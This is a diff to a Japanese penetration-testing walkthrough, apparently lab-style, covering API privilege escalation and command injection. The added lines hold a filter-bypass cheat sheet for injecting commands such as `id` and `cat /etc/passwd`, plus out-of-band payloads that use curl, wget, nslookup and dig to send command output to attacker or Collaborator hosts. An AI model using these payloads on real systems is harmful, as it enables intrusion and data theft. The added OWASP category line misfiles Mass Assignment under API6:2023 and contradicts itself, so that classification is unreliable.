@@ -38,7 +38,7 @@ curl http://[TARGET]/api/v1 -H "Cookie: PHPSESSID=<セッション>"
 
 ## Step 1: APIパラメータ改ざんによる権限昇格（必要な場合）
 
-認証後のAPIが `is_admin`, `role`, `privilege` 等のフィールドをクライアント側からの更新リクエストで受け付ける設計になっている場合、そのフィールドを改ざんすることで権限昇格できる（Broken Function Level Authorization）。
+認証後の API が `is_admin`, `role`, `privilege` 等のフィールドをクライアント側からの更新リクエストで受け付ける設計になっている場合、そのフィールドを改ざんすることで権限昇格できる。これは **OWASP API Security Top 10 (2023) の API6:2023「Unrestricted Access to Sensitive Business Flows」が整理する Mass Assignment（CWE-915）** に該当する（通称 BOPLA）。「管理者専用エンドポイントを一般ユーザが叩ける」バグは同 API5:2023 Broken Function Level Authorization (BFLA) であり別物なので用語を混同しない。
 
 ```bash
 # 管理者設定更新APIへの改ざんリクエスト例
@@ -75,6 +75,37 @@ curl http://[TARGET]/api/v1/admin/auth -H "Cookie: PHPSESSID=<セッション>"
 
 レスポンスに `uid=` が含まれればコマンドインジェクション確定。
 
+**フィルタ回避チートシート（`;` がブラックリストされている / スペースが弾かれる場合）:**
+
+| フィルタ状況 | 代替手段 | 例 |
+|---|---|---|
+| `;` ブラックリスト | `\|` / `&&` / `\|\|` / 改行 `%0a` | `test%0aid` / `test\|id` / `test&&id` |
+| スペース ` ` ブラックリスト | `${IFS}` / `<` リダイレクト / Tab `%09` | `cat${IFS}/etc/passwd` / `cat</etc/passwd` / `cat%09/etc/passwd` |
+| 両方ブラックリスト | 組み合わせ | `test%0acat${IFS}/etc/passwd` |
+| `>` / `<` 制限 | コマンド置換のみで完結 | `$(id)` / `` `id` `` |
+| アルファベット制限（WAF）| 数値 / `$((...))`  / 環境変数 | `${PATH%%/*}` / `${#0}` 等で文字を合成（高度） |
+
+**OOB（Out-of-Band）DNS / HTTP コールバックによるブラインド確認:**
+
+タイムベース（`sleep`）はロードバランサー / WAF のタイムアウト設定で偽陰性が出やすい。**DNS / HTTP コールバックは応答時間に依存しないため信頼性が高い。**
+
+```bash
+# [Attacker] HTTP コールバック（攻撃者側でリスナー起動 or Burp Collaborator / interactsh）
+{"username": "test; curl http://[COLLAB_SUBDOMAIN].oastify.com/$(id|base64)"}
+{"username": "test; wget -qO- http://[ATTACKER_HTTP_SERVER]/$(whoami)"}
+
+# [Attacker] DNS コールバック（curl / nslookup / dig）
+{"username": "test; curl http://$(id|base64 -w0).[COLLAB_SUBDOMAIN].oastify.com/"}
+{"username": "test; nslookup $(id|tr ' =' '_.').[COLLAB_SUBDOMAIN].oastify.com"}
+{"username": "test; dig +short $(whoami).[COLLAB_SUBDOMAIN].oastify.com"}
+
+# [Attacker] 外部通信が完全遮断の場合: ファイル出力経由の間接確認
+{"username": "test; id > /tmp/[CASE_ID].txt"}
+# その後 Web 経由で /tmp/[CASE_ID].txt が読めるパスを探す
+```
+
+> **interactsh（ProjectDiscovery 製 OAST）:** Burp Collaborator の無料代替。`interactsh-client` でローカルサーバ起動 or `interact.sh` の公開インスタンスを使う。`${[UNIQ_SUBDOMAIN}.interact.sh` への DNS / HTTP リクエストを観測できる。
+
 ---
 
 ## Step 3: リバースシェル取得
@@ -100,9 +131,9 @@ curl -X POST http://[TARGET]/api/v1/admin/vpn/generate \
 ```
 
 `'"'"'` の分解：
-- `'` → curlシングルクォートを閉じる
-- `"'"` → ダブルクォートでシングルクォート1文字を渡す
-- `'` → curlシングルクォートを再度開く
+- `'` → curl のシングルクォート文字列を**閉じる**
+- `"'"` → ダブルクォート文字列の中に `'` を 1 文字置く（シングルクォート 1 文字そのものを shell に渡す）
+- `'` → curl のシングルクォート文字列を**再び開く**
 
 ---
 
